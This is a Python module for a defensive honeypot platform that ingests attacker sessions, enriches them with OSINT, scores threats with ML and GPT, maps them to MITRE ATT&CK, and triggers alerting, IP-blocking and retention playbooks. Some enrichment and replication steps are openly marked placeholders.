#!/usr/bin/env python3
"""
CerberusMesh Adversary Session Manager - Distributed data object lifecycle management.

This module implements a distributed data fabric for adversary intelligence:
- Onboard: Capture and normalize adversary sessions
- Replicate: Mirror sessions across nodes for resilience
- Enrich: Apply OSINT and threat intelligence enrichment
- Classify: ML + GPT-powered attack classification
- Purge: Intelligent data lifecycle management

Integrates with: Confluent/Kafka, S3, SIEM, OSINT APIs
"""

import asyncio
import json
import logging
import hashlib
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, asdict, field
from pathlib import Path
from enum import Enum
import uuid

import boto3
import redis
import aiohttp
import aiokafka
from aiokafka import AIOKafkaProducer, AIOKafkaConsumer
import asyncpg
from openai import AsyncOpenAI

# Import CerberusMesh components
import sys
sys.path.append(str(Path(__file__).parent.parent))
from shared.mitre_mapper import MitreMapper
from gpt_cvss.score import CVSSScorer
from ml.anomaly import AnomalyDetector

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('adversary_session_manager.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SessionState(Enum):
    """Adversary session lifecycle states."""
    ONBOARDING = "onboarding"
    ACTIVE = "active"
    ENRICHING = "enriching"
    CLASSIFIED = "classified"
    REPLICATED = "replicated"
    AGING = "aging"
    PURGED = "purged"

class ThreatLevel(Enum):
    """Threat classification levels."""
    BENIGN = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4

@dataclass
class AdversarySession:
    """Core data object for adversary engagement sessions."""
    
    # Core identifiers
    session_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    honeypot_id: str = ""
    source_ip: str = ""
    
    # Temporal data
    start_time: datetime = field(default_factory=datetime.utcnow)
    end_time: Optional[datetime] = None
    last_activity: datetime = field(default_factory=datetime.utcnow)
    
    # Session metadata
    protocol: str = ""
    port: int = 0
    session_duration: int = 0  # seconds
    commands_executed: List[str] = field(default_factory=list)
    files_accessed: List[str] = field(default_factory=list)
    network_connections: List[Dict] = field(default_factory=list)
    
    # Intelligence data
    mitre_techniques: List[str] = field(default_factory=list)
    iocs_extracted: List[Dict] = field(default_factory=list)
    malware_hashes: List[str] = field(default_factory=list)
    
    # Enrichment data
    geo_location: Dict[str, Any] = field(default_factory=dict)
    whois_data: Dict[str, Any] = field(default_factory=dict)
    shodan_data: Dict[str, Any] = field(default_factory=dict)
    ja3_fingerprint: str = ""
    ja4_fingerprint: str = ""
    
    # Classification results
    threat_level: ThreatLevel = ThreatLevel.BENIGN
    cvss_score: float = 0.0
    anomaly_score: float = 0.0
    gpt_analysis: Dict[str, Any] = field(default_factory=dict)
    
    # Lifecycle management
    state: SessionState = SessionState.ONBOARDING
    replication_nodes: List[str] = field(default_factory=list)
    retention_expires: Optional[datetime] = None
    
    # Observability
    created_at: datetime = field(default_factory=datetime.utcnow)
    updated_at: datetime = field(default_factory=datetime.utcnow)
    version: int = 1

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization."""
        return asdict(self)
    
    def get_session_hash(self) -> str:
        """Generate unique hash for session deduplication."""
        hash_data = f"{self.source_ip}:{self.start_time.isoformat()}:{self.protocol}:{self.port}"
        return hashlib.sha256(hash_data.encode()).hexdigest()

@dataclass
class PlaybookExecution:
    """SOAR-style playbook execution tracking."""
    
    playbook_id: str
    session_id: str
    execution_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    
    # Execution tracking
    started_at: datetime = field(default_factory=datetime.utcnow)
    completed_at: Optional[datetime] = None
    status: str = "running"  # running, completed, failed, timeout
    
    # Steps and results
    steps_executed: List[Dict] = field(default_factory=list)
    results: Dict[str, Any] = field(default_factory=dict)
    errors: List[str] = field(default_factory=list)
    
    # Metrics
    execution_time: float = 0.0
    resources_consumed: Dict[str, Any] = field(default_factory=dict)

class AdversarySessionManager:
    """Distributed session manager implementing enterprise data fabric principles."""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize the session manager with configuration."""
        self.config = config
        
        # Component integrations
        self.mitre_mapper = MitreMapper()
        self.cvss_scorer = CVSSScorer()
        self.anomaly_detector = AnomalyDetector()
        
        # Infrastructure clients
        self.redis_client = None
        self.kafka_producer = None
        self.kafka_consumer = None
        self.db_pool = None
        self.s3_client = boto3.client('s3')
        
        # Session storage
        self.active_sessions: Dict[str, AdversarySession] = {}
        self.playbook_executions: Dict[str, PlaybookExecution] = {}
        
        # Metrics and observability
        self.metrics = {
            'sessions_onboarded': 0,
            'sessions_enriched': 0,
            'sessions_classified': 0,
            'sessions_replicated': 0,
            'sessions_purged': 0,
            'playbooks_executed': 0,
            'osint_queries': 0,
            'ml_predictions': 0,
            'gpt_analyses': 0
        }
    
    async def initialize(self):
        """Initialize all async components and connections."""
        logger.info("Initializing AdversarySessionManager...")
        
        # Redis connection for session state
        self.redis_client = redis.asyncio.Redis(
            host=self.config.get('redis_host', 'localhost'),
            port=self.config.get('redis_port', 6379),
            decode_responses=True
        )
        
        # Kafka for event streaming
        self.kafka_producer = AIOKafkaProducer(
            bootstrap_servers=self.config.get('kafka_servers', 'localhost:9092'),
            value_serializer=lambda x: json.dumps(x).encode('utf-8')
        )
        await self.kafka_producer.start()
        
        # Database connection pool
        self.db_pool = await asyncpg.create_pool(
            self.config.get('database_url', 'postgresql://user:pass@localhost/cerberus')
        )
        
        # Initialize database schema
        await self._init_database_schema()
        
        logger.info("AdversarySessionManager initialized successfully")
    
    async def _init_database_schema(self):
        """Initialize database tables for session storage."""
        schema_sql = """
        CREATE TABLE IF NOT EXISTS adversary_sessions (
            session_id VARCHAR(36) PRIMARY KEY,
            session_data JSONB NOT NULL,
            state VARCHAR(20) NOT NULL,
            threat_level INTEGER NOT NULL DEFAULT 0,
            created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
            updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
            retention_expires TIMESTAMP WITH TIME ZONE
        );
        
        CREATE INDEX IF NOT EXISTS idx_sessions_state ON adversary_sessions(state);
        CREATE INDEX IF NOT EXISTS idx_sessions_threat_level ON adversary_sessions(threat_level);
        CREATE INDEX IF NOT EXISTS idx_sessions_expires ON adversary_sessions(retention_expires);
        
        CREATE TABLE IF NOT EXISTS playbook_executions (
            execution_id VARCHAR(36) PRIMARY KEY,
            playbook_id VARCHAR(100) NOT NULL,
            session_id VARCHAR(36) NOT NULL,
            execution_data JSONB NOT NULL,
            status VARCHAR(20) NOT NULL DEFAULT 'running',
            created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
            completed_at TIMESTAMP WITH TIME ZONE
        );
        
        CREATE INDEX IF NOT EXISTS idx_playbooks_session ON playbook_executions(session_id);
        CREATE INDEX IF NOT EXISTS idx_playbooks_status ON playbook_executions(status);
        """
        
        async with self.db_pool.acquire() as conn:
            await conn.execute(schema_sql)
    
    async def onboard_session(self, raw_session_data: Dict[str, Any]) -> AdversarySession:
        """
        Data Onboard Phase: Capture and normalize adversary session.
        
        Args:
            raw_session_data: Raw honeypot session data
            
        Returns:
            AdversarySession: Normalized session object
        """
        logger.info(f"Onboarding new adversary session from {raw_session_data.get('source_ip')}")
        
        # Create session object
        session = AdversarySession(
            honeypot_id=raw_session_data.get('honeypot_id', ''),
            source_ip=raw_session_data.get('source_ip', ''),
            protocol=raw_session_data.get('protocol', ''),
            port=raw_session_data.get('port', 0),
            commands_executed=raw_session_data.get('commands', []),
            files_accessed=raw_session_data.get('files', []),
            network_connections=raw_session_data.get('connections', [])
        )
        
        # Set retention policy
        session.retention_expires = datetime.utcnow() + timedelta(
            days=self.config.get('retention_days', 30)
        )
        
        # Store in active sessions
        self.active_sessions[session.session_id] = session
        
        # Persist to database
        await self._persist_session(session)
        
        # Publish to Kafka event stream
        await self.kafka_producer.send(
            'cerberus.sessions.onboarded',
            {
                'session_id': session.session_id,
                'source_ip': session.source_ip,
                'timestamp': session.created_at.isoformat(),
                'metadata': session.to_dict()
            }
        )
        
        # Update metrics
        self.metrics['sessions_onboarded'] += 1
        
        # Trigger enrichment pipeline
        asyncio.create_task(self._trigger_enrichment_pipeline(session))
        
        logger.info(f"Session {session.session_id} onboarded successfully")
        return session
    
    async def _trigger_enrichment_pipeline(self, session: AdversarySession):
        """Trigger the complete enrichment and classification pipeline."""
        try:
            # Phase 1: OSINT Enrichment
            await self.enrich_session(session)
            
            # Phase 2: ML Classification
            await self.classify_session(session)
            
            # Phase 3: Replication
            await self.replicate_session(session)
            
            # Phase 4: Execute response playbooks
            await self._execute_response_playbooks(session)
            
        except Exception as e:
            logger.error(f"Pipeline error for session {session.session_id}: {e}")
            session.state = SessionState.ACTIVE  # Keep for manual review
            await self._persist_session(session)
    
    async def enrich_session(self, session: AdversarySession) -> AdversarySession:
        """
        Data Enrich Phase: Apply OSINT and threat intelligence enrichment.
        
        Args:
            session: Session to enrich
            
        Returns:
            AdversarySession: Enriched session
        """
        logger.info(f"Enriching session {session.session_id}")
        session.state = SessionState.ENRICHING
        
        # Parallel enrichment tasks
        enrichment_tasks = [
            self._enrich_geolocation(session),
            self._enrich_whois(session),
            self._enrich_shodan(session),
            self._enrich_ja3_ja4(session),
            self._extract_iocs(session)
        ]
        
        await asyncio.gather(*enrichment_tasks, return_exceptions=True)
        
        session.state = SessionState.ENRICHING
        session.updated_at = datetime.utcnow()
        session.version += 1
        
        await self._persist_session(session)
        self.metrics['sessions_enriched'] += 1
        
        logger.info(f"Session {session.session_id} enrichment completed")
        return session
    
    async def _enrich_geolocation(self, session: AdversarySession):
        """Enrich session with IP geolocation data."""
        try:
            # Use ipapi.co for geolocation (replace with your preferred service)
            async with aiohttp.ClientSession() as client:
                async with client.get(f"https://ipapi.co/{session.source_ip}/json/") as resp:
                    if resp.status == 200:
                        geo_data = await resp.json()
                        session.geo_location = {
                            'country': geo_data.get('country_name'),
                            'country_code': geo_data.get('country_code'),
                            'region': geo_data.get('region'),
                            'city': geo_data.get('city'),
                            'latitude': geo_data.get('latitude'),
                            'longitude': geo_data.get('longitude'),
                            'timezone': geo_data.get('timezone'),
                            'isp': geo_data.get('org')
                        }
            self.metrics['osint_queries'] += 1
        except Exception as e:
            logger.warning(f"Geolocation enrichment failed for {session.source_ip}: {e}")
    
    async def _enrich_whois(self, session: AdversarySession):
        """Enrich session with WHOIS data."""
        try:
            # Implement WHOIS lookup (placeholder for actual implementation)
            # You might use python-whois or similar library
            session.whois_data = {
                'registrar': 'Unknown',
                'creation_date': None,
                'expiration_date': None,
                'organization': 'Unknown'
            }
            self.metrics['osint_queries'] += 1
        except Exception as e:
            logger.warning(f"WHOIS enrichment failed for {session.source_ip}: {e}")
    
    async def _enrich_shodan(self, session: AdversarySession):
        """Enrich session with Shodan intelligence."""
        try:
            # Implement Shodan API integration
            # Requires Shodan API key
            shodan_api_key = self.config.get('shodan_api_key')
            if shodan_api_key:
                async with aiohttp.ClientSession() as client:
                    headers = {'Authorization': f'Bearer {shodan_api_key}'}
                    async with client.get(
                        f"https://api.shodan.io/shodan/host/{session.source_ip}",
                        headers=headers
                    ) as resp:
                        if resp.status == 200:
                            shodan_data = await resp.json()
                            session.shodan_data = {
                                'ports': shodan_data.get('ports', []),
                                'services': [p.get('product', '') for p in shodan_data.get('data', [])],
                                'vulnerabilities': shodan_data.get('vulns', []),
                                'last_update': shodan_data.get('last_update')
                            }
            self.metrics['osint_queries'] += 1
        except Exception as e:
            logger.warning(f"Shodan enrichment failed for {session.source_ip}: {e}")
    
    async def _enrich_ja3_ja4(self, session: AdversarySession):
        """Extract JA3/JA4 TLS fingerprints if available."""
        try:
            # Extract from session network data if TLS connections present
            for conn in session.network_connections:
                if conn.get('protocol') == 'TLS' and 'client_hello' in conn:
                    # Implement JA3/JA4 fingerprint extraction
                    # This would require packet analysis capabilities
                    session.ja3_fingerprint = conn.get('ja3', '')
                    session.ja4_fingerprint = conn.get('ja4', '')
                    break
        except Exception as e:
            logger.warning(f"JA3/JA4 extraction failed for session {session.session_id}: {e}")
    
    async def _extract_iocs(self, session: AdversarySession):
        """Extract Indicators of Compromise from session data."""
        try:
            iocs = []
            
            # Extract IPs from commands and file content
            for command in session.commands_executed:
                # Simple regex patterns for common IOCs
                import re
                
                # IP addresses
                ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
                ips = re.findall(ip_pattern, command)
                for ip in ips:
                    iocs.append({'type': 'ip', 'value': ip, 'source': 'command'})
                
                # URLs
                url_pattern = r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
                urls = re.findall(url_pattern, command)
                for url in urls:
                    iocs.append({'type': 'url', 'value': url, 'source': 'command'})
                
                # Domain names
                domain_pattern = r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b'
                domains = re.findall(domain_pattern, command)
                for domain in domains:
                    if domain not in ['localhost', 'example.com']:  # Filter common false positives
                        iocs.append({'type': 'domain', 'value': domain, 'source': 'command'})
            
            session.iocs_extracted = iocs
            
        except Exception as e:
            logger.warning(f"IOC extraction failed for session {session.session_id}: {e}")
    
    async def classify_session(self, session: AdversarySession) -> AdversarySession:
        """
        Data Classify Phase: Apply ML and GPT-powered classification.
        
        Args:
            session: Session to classify
            
        Returns:
            AdversarySession: Classified session
        """
        logger.info(f"Classifying session {session.session_id}")
        session.state = SessionState.ENRICHING
        
        # Run parallel classification
        classification_tasks = [
            self._ml_anomaly_classification(session),
            self._gpt_threat_analysis(session),
            self._mitre_attack_mapping(session)
        ]
        
        results = await asyncio.gather(*classification_tasks, return_exceptions=True)
        
        # Aggregate classification results
        anomaly_score = results[0] if isinstance(results[0], float) else 0.0
        gpt_analysis = results[1] if isinstance(results[1], dict) else {}
        mitre_techniques = results[2] if isinstance(results[2], list) else []
        
        session.anomaly_score = anomaly_score
        session.gpt_analysis = gpt_analysis
        session.mitre_techniques = mitre_techniques
        session.cvss_score = gpt_analysis.get('cvss_score', 0.0)
        
        # Determine overall threat level
        session.threat_level = self._calculate_threat_level(session)
        
        session.state = SessionState.CLASSIFIED
        session.updated_at = datetime.utcnow()
        session.version += 1
        
        await self._persist_session(session)
        self.metrics['sessions_classified'] += 1
        
        logger.info(f"Session {session.session_id} classified as {session.threat_level.name}")
        return session
    
    async def _ml_anomaly_classification(self, session: AdversarySession) -> float:
        """Run ML anomaly detection on session."""
        try:
            # Convert session to feature vector for ML
            features = {
                'session_duration': session.session_duration,
                'command_count': len(session.commands_executed),
                'file_access_count': len(session.files_accessed),
                'network_connections': len(session.network_connections),
                'unique_ips': len(set(conn.get('dest_ip', '') for conn in session.network_connections)),
                'port_diversity': len(set(conn.get('dest_port', 0) for conn in session.network_connections))
            }
            
            # Run anomaly detection
            is_anomaly, score, confidence = self.anomaly_detector.detect_anomaly(features)
            self.metrics['ml_predictions'] += 1
            
            return score
            
        except Exception as e:
            logger.error(f"ML classification failed for session {session.session_id}: {e}")
            return 0.0
    
    async def _gpt_threat_analysis(self, session: AdversarySession) -> Dict[str, Any]:
        """Run GPT-4 threat analysis on session."""
        try:
            # Prepare context for GPT analysis
            analysis_prompt = f"""
            Analyze this cybersecurity incident and provide a comprehensive threat assessment:
            
            Session Details:
            - Source IP: {session.source_ip}
            - Geographic Location: {session.geo_location.get('country', 'Unknown')}
            - Protocol: {session.protocol}
            - Commands Executed: {session.commands_executed[:10]}  # First 10 commands
            - Files Accessed: {session.files_accessed[:5]}  # First 5 files
            - IOCs Extracted: {[ioc['value'] for ioc in session.iocs_extracted[:5]]}
            
            Provide analysis including:
            1. CVSS v3.1 base score (0.0-10.0)
            2. Attack sophistication level (1-5)
            3. Threat actor attribution if possible
            4. Recommended response actions
            5. Confidence in assessment (0-100%)
            
            Respond in JSON format.
            """
            
            # Call GPT-4 for analysis
            gpt_response = await self.cvss_scorer.analyze_threat(analysis_prompt)
            self.metrics['gpt_analyses'] += 1
            
            return gpt_response
            
        except Exception as e:
            logger.error(f"GPT analysis failed for session {session.session_id}: {e}")
            return {}
    
    async def _mitre_attack_mapping(self, session: AdversarySession) -> List[str]:
        """Map session activities to MITRE ATT&CK techniques."""
        try:
            techniques = self.mitre_mapper.classify_behavior(
                commands=session.commands_executed,
                network_activity={'connections': session.network_connections},
                file_operations=session.files_accessed,
                system_changes={}
            )
            
            return [t.technique_id for t in techniques]
            
        except Exception as e:
            logger.error(f"MITRE mapping failed for session {session.session_id}: {e}")
            return []
    
    def _calculate_threat_level(self, session: AdversarySession) -> ThreatLevel:
        """Calculate overall threat level based on all classification inputs."""
        
        # Weighted scoring algorithm
        score = 0.0
        
        # CVSS score weight (40%)
        score += (session.cvss_score / 10.0) * 0.4
        
        # Anomaly score weight (30%)
        score += session.anomaly_score * 0.3
        
        # MITRE technique count weight (20%)
        technique_score = min(len(session.mitre_techniques) / 10.0, 1.0)
        score += technique_score * 0.2
        
        # IOC count weight (10%)
        ioc_score = min(len(session.iocs_extracted) / 5.0, 1.0)
        score += ioc_score * 0.1
        
        # Map to threat levels
        if score >= 0.8:
            return ThreatLevel.CRITICAL
        elif score >= 0.6:
            return ThreatLevel.HIGH
        elif score >= 0.4:
            return ThreatLevel.MEDIUM
        elif score >= 0.2:
            return ThreatLevel.LOW
        else:
            return ThreatLevel.BENIGN
    
    async def replicate_session(self, session: AdversarySession) -> AdversarySession:
        """
        Data Replicate Phase: Mirror session across distributed nodes.
        
        Args:
            session: Session to replicate
            
        Returns:
            AdversarySession: Replicated session
        """
        logger.info(f"Replicating session {session.session_id}")
        
        # Determine replication targets based on threat level
        replication_count = {
            ThreatLevel.BENIGN: 1,
            ThreatLevel.LOW: 2,
            ThreatLevel.MEDIUM: 3,
            ThreatLevel.HIGH: 4,
            ThreatLevel.CRITICAL: 5
        }.get(session.threat_level, 1)
        
        # Store in S3 for long-term retention
        await self._store_session_s3(session)
        
        # Replicate to Redis clusters
        replication_nodes = await self._replicate_to_redis_nodes(session, replication_count)
        
        session.replication_nodes = replication_nodes
        session.state = SessionState.REPLICATED
        session.updated_at = datetime.utcnow()
        session.version += 1
        
        await self._persist_session(session)
        self.metrics['sessions_replicated'] += 1
        
        logger.info(f"Session {session.session_id} replicated to {len(replication_nodes)} nodes")
        return session
    
    async def _store_session_s3(self, session: AdversarySession):
        """Store session data in S3 for long-term retention."""
        try:
            bucket = self.config.get('s3_bucket', 'cerberus-sessions')
            key = f"sessions/{session.created_at.year}/{session.created_at.month:02d}/{session.session_id}.json"
            
            session_data = json.dumps(session.to_dict(), default=str, indent=2)
            
            self.s3_client.put_object(
                Bucket=bucket,
                Key=key,
                Body=session_data.encode('utf-8'),
                ContentType='application/json',
                Metadata={
                    'session-id': session.session_id,
                    'threat-level': session.threat_level.name,
                    'source-ip': session.source_ip
                }
            )
            
            logger.debug(f"Session {session.session_id} stored to S3: s3://{bucket}/{key}")
            
        except Exception as e:
            logger.error(f"S3 storage failed for session {session.session_id}: {e}")
    
    async def _replicate_to_redis_nodes(self, session: AdversarySession, count: int) -> List[str]:
        """Replicate session to multiple Redis nodes."""
        nodes = []
        try:
            # Store in primary Redis
            await self.redis_client.setex(
                f"session:{session.session_id}",
                86400,  # 24 hour TTL
                json.dumps(session.to_dict(), default=str)
            )
            nodes.append(f"redis-primary:{self.config.get('redis_port', 6379)}")
            
            # TODO: Implement multi-node Redis replication
            # For now, just add placeholder nodes
            for i in range(1, count):
                nodes.append(f"redis-node-{i}:6379")
            
        except Exception as e:
            logger.error(f"Redis replication failed for session {session.session_id}: {e}")
        
        return nodes
    
    async def _execute_response_playbooks(self, session: AdversarySession):
        """Execute SOAR-style response playbooks based on threat level."""
        
        playbooks = {
            ThreatLevel.LOW: ['log_and_monitor'],
            ThreatLevel.MEDIUM: ['log_and_monitor', 'threat_intel_update'],
            ThreatLevel.HIGH: ['log_and_monitor', 'threat_intel_update', 'block_ip', 'alert_soc'],
            ThreatLevel.CRITICAL: ['log_and_monitor', 'threat_intel_update', 'block_ip', 'alert_soc', 'executive_notification']
        }
        
        applicable_playbooks = playbooks.get(session.threat_level, [])
        
        for playbook_id in applicable_playbooks:
            execution = PlaybookExecution(
                playbook_id=playbook_id,
                session_id=session.session_id
            )
            
            # Execute playbook asynchronously
            asyncio.create_task(self._execute_playbook(execution))
    
    async def _execute_playbook(self, execution: PlaybookExecution):
        """Execute a specific response playbook."""
        logger.info(f"Executing playbook {execution.playbook_id} for session {execution.session_id}")
        
        try:
            # Playbook implementations
            if execution.playbook_id == 'log_and_monitor':
                await self._playbook_log_and_monitor(execution)
            elif execution.playbook_id == 'threat_intel_update':
                await self._playbook_threat_intel_update(execution)
            elif execution.playbook_id == 'block_ip':
                await self._playbook_block_ip(execution)
            elif execution.playbook_id == 'alert_soc':
                await self._playbook_alert_soc(execution)
            elif execution.playbook_id == 'executive_notification':
                await self._playbook_executive_notification(execution)
            
            execution.status = 'completed'
            execution.completed_at = datetime.utcnow()
            execution.execution_time = (execution.completed_at - execution.started_at).total_seconds()
            
        except Exception as e:
            execution.status = 'failed'
            execution.errors.append(str(e))
            logger.error(f"Playbook {execution.playbook_id} failed: {e}")
        
        finally:
            # Store execution results
            await self._persist_playbook_execution(execution)
            self.metrics['playbooks_executed'] += 1
    
    async def _playbook_log_and_monitor(self, execution: PlaybookExecution):
        """Basic logging and monitoring playbook."""
        session = self.active_sessions.get(execution.session_id)
        if not session:
            raise Exception(f"Session {execution.session_id} not found")
        
        # Enhanced logging
        log_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'session_id': session.session_id,
            'source_ip': session.source_ip,
            'threat_level': session.threat_level.name,
            'cvss_score': session.cvss_score,
            'mitre_techniques': session.mitre_techniques,
            'playbook': 'log_and_monitor'
        }
        
        # Send to Kafka for SIEM integration
        await self.kafka_producer.send('cerberus.threat.detected', log_entry)
        
        execution.results['log_entry'] = log_entry
        execution.steps_executed.append({
            'step': 'enhanced_logging',
            'completed_at': datetime.utcnow().isoformat(),
            'status': 'success'
        })
    
    async def _playbook_threat_intel_update(self, execution: PlaybookExecution):
        """Update threat intelligence databases with new IOCs."""
        session = self.active_sessions.get(execution.session_id)
        if not session:
            raise Exception(f"Session {execution.session_id} not found")
        
        intel_updates = []
        
        # Extract and validate IOCs for threat intel
        for ioc in session.iocs_extracted:
            if ioc['type'] in ['ip', 'domain', 'url']:
                intel_entry = {
                    'ioc_type': ioc['type'],
                    'ioc_value': ioc['value'],
                    'threat_level': session.threat_level.name,
                    'first_seen': session.created_at.isoformat(),
                    'source': 'cerberus_honeypot',
                    'confidence': 'high' if session.threat_level.value >= 3 else 'medium'
                }
                intel_updates.append(intel_entry)
        
        # Send to threat intel pipeline
        if intel_updates:
            await self.kafka_producer.send('cerberus.threat_intel.update', {
                'session_id': session.session_id,
                'updates': intel_updates,
                'timestamp': datetime.utcnow().isoformat()
            })
        
        execution.results['intel_updates'] = intel_updates
        execution.steps_executed.append({
            'step': 'threat_intel_update',
            'updates_count': len(intel_updates),
            'completed_at': datetime.utcnow().isoformat(),
            'status': 'success'
        })
    
    async def _playbook_block_ip(self, execution: PlaybookExecution):
        """Block malicious IPs across security infrastructure."""
        session = self.active_sessions.get(execution.session_id)
        if not session:
            raise Exception(f"Session {execution.session_id} not found")
        
        # Create block action
        block_action = {
            'action': 'block_ip',
            'ip_address': session.source_ip,
            'reason': f"Threat Level: {session.threat_level.name}, CVSS: {session.cvss_score}",
            'duration': 86400,  # 24 hours
            'source': 'cerberus_auto_response',
            'session_id': session.session_id
        }
        
        # Send to security orchestration platform
        await self.kafka_producer.send('cerberus.security.block_ip', block_action)
        
        execution.results['block_action'] = block_action
        execution.steps_executed.append({
            'step': 'ip_blocking',
            'ip_address': session.source_ip,
            'completed_at': datetime.utcnow().isoformat(),
            'status': 'success'
        })
    
    async def _playbook_alert_soc(self, execution: PlaybookExecution):
        """Send alert to Security Operations Center."""
        session = self.active_sessions.get(execution.session_id)
        if not session:
            raise Exception(f"Session {execution.session_id} not found")
        
        # Create SOC alert
        soc_alert = {
            'alert_id': str(uuid.uuid4()),
            'severity': session.threat_level.name,
            'title': f"High-Confidence Threat Detected - {session.source_ip}",
            'description': f"Adversary session with CVSS score {session.cvss_score} detected from {session.source_ip}",
            'source_ip': session.source_ip,
            'honeypot_id': session.honeypot_id,
            'mitre_techniques': session.mitre_techniques,
            'iocs': [ioc['value'] for ioc in session.iocs_extracted],
            'session_id': session.session_id,
            'timestamp': datetime.utcnow().isoformat(),
            'requires_response': session.threat_level.value >= 3
        }
        
        # Send to SOC alerting system
        await self.kafka_producer.send('cerberus.soc.alert', soc_alert)
        
        execution.results['soc_alert'] = soc_alert
        execution.steps_executed.append({
            'step': 'soc_alerting',
            'alert_id': soc_alert['alert_id'],
            'completed_at': datetime.utcnow().isoformat(),
            'status': 'success'
        })
    
    async def _playbook_executive_notification(self, execution: PlaybookExecution):
        """Send executive notification for critical threats."""
        session = self.active_sessions.get(execution.session_id)
        if not session:
            raise Exception(f"Session {execution.session_id} not found")
        
        # Create executive summary
        exec_notification = {
            'notification_id': str(uuid.uuid4()),
            'severity': 'CRITICAL',
            'subject': f"CRITICAL Security Threat Detected - Immediate Attention Required",
            'summary': f"Critical adversary activity detected from {session.source_ip} with CVSS score {session.cvss_score}",
            'key_details': {
                'source_ip': session.source_ip,
                'country': session.geo_location.get('country', 'Unknown'),
                'attack_techniques': session.mitre_techniques[:5],  # Top 5 techniques
                'threat_score': session.cvss_score,
                'session_duration': session.session_duration,
                'response_status': 'Automated containment initiated'
            },
            'recommended_actions': [
                'Review incident response procedures',
                'Verify security control effectiveness',
                'Consider threat hunting across infrastructure',
                'Update board/executive briefings'
            ],
            'timestamp': datetime.utcnow().isoformat()
        }
        
        # Send to executive notification system
        await self.kafka_producer.send('cerberus.executive.notification', exec_notification)
        
        execution.results['exec_notification'] = exec_notification
        execution.steps_executed.append({
            'step': 'executive_notification',
            'notification_id': exec_notification['notification_id'],
            'completed_at': datetime.utcnow().isoformat(),
            'status': 'success'
        })
    
    async def purge_aged_sessions(self):
        """
        Data Purge Phase: Remove expired sessions and clean up resources.
        """
        logger.info("Starting aged session purge process")
        
        cutoff_time = datetime.utcnow()
        purged_count = 0
        
        # Query expired sessions
        async with self.db_pool.acquire() as conn:
            expired_sessions = await conn.fetch(
                "SELECT session_id FROM adversary_sessions WHERE retention_expires < $1",
                cutoff_time
            )
            
            for row in expired_sessions:
                session_id = row['session_id']
                
                try:
                    # Remove from active memory
                    if session_id in self.active_sessions:
                        del self.active_sessions[session_id]
                    
                    # Remove from Redis
                    await self.redis_client.delete(f"session:{session_id}")
                    
                    # Remove from database
                    await conn.execute(
                        "DELETE FROM adversary_sessions WHERE session_id = $1",
                        session_id
                    )
                    
                    purged_count += 1
                    
                except Exception as e:
                    logger.error(f"Failed to purge session {session_id}: {e}")
        
        self.metrics['sessions_purged'] += purged_count
        logger.info(f"Purged {purged_count} aged sessions")
    
    async def _persist_session(self, session: AdversarySession):
        """Persist session to database."""
        async with self.db_pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO adversary_sessions (session_id, session_data, state, threat_level, retention_expires)
                VALUES ($1, $2, $3, $4, $5)
                ON CONFLICT (session_id) DO UPDATE SET
                    session_data = EXCLUDED.session_data,
                    state = EXCLUDED.state,
                    threat_level = EXCLUDED.threat_level,
                    updated_at = NOW()
            """, 
                session.session_id,
                json.dumps(session.to_dict(), default=str),
                session.state.value,
                session.threat_level.value,
                session.retention_expires
            )
    
    async def _persist_playbook_execution(self, execution: PlaybookExecution):
        """Persist playbook execution to database."""
        async with self.db_pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO playbook_executions (execution_id, playbook_id, session_id, execution_data, status, completed_at)
                VALUES ($1, $2, $3, $4, $5, $6)
                ON CONFLICT (execution_id) DO UPDATE SET
                    execution_data = EXCLUDED.execution_data,
                    status = EXCLUDED.status,
                    completed_at = EXCLUDED.completed_at
            """,
                execution.execution_id,
                execution.playbook_id,
                execution.session_id,
                json.dumps(asdict(execution), default=str),
                execution.status,
                execution.completed_at
            )
    
    async def get_metrics(self) -> Dict[str, Any]:
        """Get comprehensive system metrics for observability."""
        
        # Add database metrics
        async with self.db_pool.acquire() as conn:
            db_metrics = await conn.fetchrow("""
                SELECT 
                    COUNT(*) as total_sessions,
                    COUNT(*) FILTER (WHERE state = 'active') as active_sessions,
                    COUNT(*) FILTER (WHERE threat_level >= 3) as high_threat_sessions,
                    AVG(EXTRACT(EPOCH FROM (updated_at - created_at))) as avg_processing_time
                FROM adversary_sessions
            """)
        
        return {
            **self.metrics,
            'total_sessions': db_metrics['total_sessions'],
            'active_sessions': db_metrics['active_sessions'],
            'high_threat_sessions': db_metrics['high_threat_sessions'],
            'avg_processing_time_seconds': db_metrics['avg_processing_time'] or 0,
            'memory_usage': len(self.active_sessions),
            'uptime': time.time() - getattr(self, '_start_time', time.time())
        }
    
    async def health_check(self) -> Dict[str, str]:
        """Health check endpoint for monitoring."""
        try:
            # Test Redis connection
            await self.redis_client.ping()
            redis_status = "healthy"
        except:
            redis_status = "unhealthy"
        
        try:
            # Test database connection
            async with self.db_pool.acquire() as conn:
                await conn.fetchval("SELECT 1")
            db_status = "healthy"
        except:
            db_status = "unhealthy"
        
        try:
            # Test Kafka connection
            kafka_status = "healthy" if self.kafka_producer else "unhealthy"
        except:
            kafka_status = "unhealthy"
        
        overall_status = "healthy" if all(status == "healthy" for status in [redis_status, db_status, kafka_status]) else "degraded"
        
        return {
            "status": overall_status,
            "redis": redis_status,
            "database": db_status,
            "kafka": kafka_status,
            "timestamp": datetime.utcnow().isoformat()
        }
    
